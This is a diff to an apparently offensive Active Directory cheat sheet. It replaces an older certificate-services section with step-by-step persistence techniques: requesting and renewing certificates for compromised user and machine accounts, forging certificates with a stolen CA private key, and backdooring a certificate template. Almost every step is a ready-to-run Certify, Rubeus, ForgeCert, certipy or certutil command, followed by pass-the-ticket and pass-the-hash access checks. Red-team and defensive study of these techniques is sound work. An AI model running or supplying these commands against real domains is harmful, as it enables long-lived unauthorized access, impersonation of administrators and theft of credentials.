@@ -13,8 +13,13 @@
   * [SecurityDescriptor - Remote Registry](#SecurityDescriptor---Remote-Registry)
   * [msDS-AllowedToDelegateTo](#msDS-AllowedToDelegateTo)
 * [Computer Account](#Computer-Account)
-* [Active Directory Certificate Services](#Active-Directory-Certificate-Services)
 * [LAPS](#LAPS)
+* [Active Directory Certificate Services](#Active-Directory-Certificate-Services)
+  * [PERSIST1 User account new certificate](#PERSIST1-User-account-new-certificate)
+  * [PERSIST2 Machine Account new certificate](#PERSIST2-Machine-Account-new-certificate)
+  * [PERSIST3 Certificate Renewal](#PERSIST3-Certificate-Renewal)
+  * [DPersists1 Certificate forgery with stolen CA keys](#DPersists1-Certificate-forgery-with-stolen-CA-keys)
+  * [Dpersist3 Configure vulnerable template](#Dpersist3-Configure-vulnerable-template)
 
 ## Golden ticket
 - https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets
@@ -343,60 +348,6 @@ New-MachineAccount -Domain <DOMAIN> -MachineAccount <NAME OF MACHINE TO ADD> -Do
 runas /netonly /user:<DOMAIN>\<COMPUTERACCOUNTNAME> powershell
 ```
 
-## Active Directory Certificate Services
-#### Find certificated that permit client authentication
-- Important to look at:
-  - The validity period
-  - Authorization is not required.
-  - Who has enrollment rights.
-```
-.\Certify.exe find /clientauth
-```
-
-#### Request a certificate user
-- Uses the current user
-```
-.\Certify.exe request /ca:<CA NAME> /template:<TEMPLATE NAME>
-```
-
-#### Request a certificate machine
-```
-.\Certify.exe request /ca:<CA NAME> /template:<TEMPLATE NAME> /machine
-```
-
-### Forged Certificates
-#### Dump the private keys
-- Execute on the CA server. You can generally tell this is the private CA key because the Issuer and Subject are both set to the distinguished name of the CA.
-- https://github.com/GhostPack/SharpDPAPI
-```
-.\SharpDPAPI.exe certificates /machine
-```
-- Save cert + key in a cert.pem file
-
-#### Transform cert to pfx
-- Set a password, password
-```
-openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
-```
-
-#### Create a forged certificate
-```
-.\ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "password" --Subject "CN=User" --SubjectAltName "Administrator@<DOMAIN>" --NewCertPath fake.pfx --NewCertPassword "password"
-```
-
-#### Create a TGT
-```
-cat cert.pfx | base64 -w 0
-.\Rubeus.exe asktgt /user:Administrator /domain:<DOMAIN> /certificate:<BASE64 CERT> /password:password /nowrap
-```
-
-#### Write TGT kirbi
-```
-[System.IO.File]::WriteAllBytes("C:\Users\public\<USER>.kirbi", [System.Convert]::FromBase64String("<TICKET STRING>"))
-```
- 
-#### Then load TGT and request TGS or access systems as this user.
-
 ## LAPS
 - The password will still reset if an admin uses the Reset-AdmPwdPassword cmdlet; or if Do not allow password expiration time longer than required by policy is enabled in the LAPS GPO.
 - Must run from system
@@ -419,3 +370,166 @@ System.IO.File.AppendAllText(@"C:\Temp\LAPS.txt", line);
 
 WriteObject(pi);
 ```
+
+### Active Directory Certificate Services
+### PERSIST1 User account new certificate
+- A certificate remains valid even if the target user account password is changed.
+- If we compromise a user who has enrollment rights to an AD CS template that has the Client Authentication EKU enabled, we can request and use a certificate that will be valid until the expiry specified in the template
+
+#### Request certificate
+```
+.\Certify.exe request /ca:<FQDN CA>\<CA NAME> /template:<TEMPLATE NAME> /user:<SAMACCOUNTNAME>
+```
+
+#### Convert Pem to PFX with openssl
+- Save the private key and cert to `cert.pem`
+```
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+```
+
+### Pass the certificate Request TGT
+```
+.\Rubeus.exe asktgt /user:<USER> /certificate:<PATH TO cert.pfx> /password:<PASSWORD> /domain:<FQDN DOMAIN> /dc:<FQDN DC> /nowrap /ptt
+```
+
+### PERSIST2 Machine Account new certificate
+- Requirements
+	- System rights on a domain joined machine 
+	- Extended Key Usage: `Client Authentication`
+	- Enrollment Rights a for domain computer
+
+#### Request certificate
+- Run when connected on the machine
+```
+.\Certify.exe request /ca:<FQDN CA>\<CA NAME> /template:<TEMPLATE NAME> /machine
+```
+
+#### Convert Pem to PFX with openssl
+- Save the private key and cert to `cert.pem`
+```
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+```
+
+#### Request TGT and perform S4USelf like Certpotato
+- [CertPotato](windows-ad/Domain-Privilege-Escalation.md#Local-privesc-CertPotato)
+
+### PERSIST3 Certificate Renewal
+- Renew compromised/requested certificates before they expire
+
+#### Install certificate
+```
+.\CertifyKit.exe list /certificate:<PATH TO PFX> /password:<PASSWORD> /install
+```
+
+#### Get serial number
+```
+certutil -user -store My
+```
+
+#### Renew certificate
+```
+certreq -enroll -user -q -PolicyServer * -cert <CERT SERIAL> renew reusekeys
+```
+
+#### Renew certificate and key
+```
+certreq -enroll -user -q -cert <CERT SERIAL> renew
+```
+
+#### List new cert
+```
+certutil -user -store My
+```
+
+#### Use THEFT1 to export certificate and then pass the certificate to get TGT or NTLM hash
+
+### DPersists1 Certificate forgery with stolen CA keys
+- Golden Cert attack
+
+#### Enumerate CA
+- Execute on the CA server
+```
+certutil -CAInfo
+```
+
+### Golden Cert attack
+#### Export certificate
+```
+certutil -exportpfx -p "<PASSWORD>" -enterprise Root <SERIAL NUMBER> C:\users\public\CA.p12
+```
+
+### Windows
+#### Get user/computer to forge certificate for
+```
+Get-DomainUser <USERNAME> | Select-Object samaccountname, distinguishedName, objectsid
+```
+
+#### Forge certificate
+- If cross forest make sure `Subject` and `SubjectAltName` are for user in the target forest
+```
+.\ForgeCert.exe --CaCertPath "CA.p12" --CaCertPassword <PASSWORD> --Subject "<DistinguishedName path>" --SubjectAltName <USER>@<FQDN DOMAIN> --NewCertPath "forged-ea.pfx" --NewCertPassword "<PASSWORD>"
+```
+
+#### Select cert template
+- Find template with client auth
+```
+.\Certify.exe find
+```
+
+#### Request Cert for User
+- If cross forest make sure `ca`, `onbehalfof`, `domain`, `dc`  `sidextension` are for user in the target forest
+```
+.\Certify.exe request /ca:<FQDN CA>\<CA NAME> /template:<TEMPLATE> /onbehalfof:<DOMAIN>\<USER> /enrollcert:"forged-ea.pfx" /enrollcertpw:"<PASSWORD>" /domain:<FQDN DOMAIN> /dc:<FQDN DC> /sidextension:<TARGET OBJECT SID>
+```
+
+#### Convert Pem to PFX with openssl
+- Save the private key and cert to `cert.pem`
+```
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+```
+
+#### Request TGT
+- Add `/getcredentials` to also retrieve the NTLM hash
+```
+.\Rubeus.exe asktgt /user:<USER> /certificate:<PATH TO cert.pfx> /password:<PASSWORD> /domain:<FQDN DOMAIN> /dc:<FQDN DC> /nowrap /ptt
+```
+
+#### Check access
+```
+dir \\<TARGET FQDN>\c$
+winrs -r:<TARGET FQDN> whoami
+```
+
+### Linux
+#### Unprotect pfx file for authentication certipy
+```
+certipy cert -export -pfx "CA.p12" -password "<PASSWORD>" -out "CA-unprotected.p12"
+```
+
+#### Forge certificate
+```
+certipy forge -ca-pfx 'CA-unprotected.p12' -upn <SAMACCOUNTNAME>@<FQDN DOMAIN> -subject
+'<DistinguishedName path>' -out 'forged-ea.pfx' -extensionsid <TARGET OBJECT SID>
+```
+
+#### Unpac the hash
+```
+certipy auth -pfx 'forged-ea.pfx'
+```
+
+#### Check access
+```
+cme smb <FQDN> -u <USER> -H <NTLM HASH>
+```
+
+### Dpersist3 Configure vulnerable template
+- Requires `Enterprise Admin` permissions
+
+#### Add WriteOwner permissions to target template
+```
+.\StandIn_v13_Net45.exe --adcs --filter <TEMPLATE NAME> --ntaccount "<DOMAIN>\<USER>" --write --add
+```
+
+#### Abuse WriteOwner permissions
+- [ESC4](windows-ad/Domain-Privilege-Escalation.md#ESC4-Template-ACEs)
+
